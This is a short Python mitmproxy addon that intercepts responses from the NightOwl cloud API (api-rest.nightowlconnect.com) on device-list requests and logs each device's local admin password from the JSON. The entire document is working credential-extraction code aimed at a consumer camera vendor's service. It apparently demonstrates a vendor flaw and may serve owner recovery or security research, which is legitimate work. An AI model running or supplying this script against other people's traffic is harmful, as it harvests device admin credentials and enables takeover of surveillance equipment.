"""
This script reveals the nightowl local admin password
"""

from mitmproxy import http, ctx
import json

def response(flow: http.HTTPFlow) -> None:

    if "api-rest.nightowlconnect.com" in flow.request.pretty_host and "device/device?" in flow.request.url:
        data = json.loads(flow.response.content)
        dev_list = data['list']
        for dev in dev_list:
           ctx.log.alert("[NightOwl] Admin Password: %s" %dev['device_password'])        
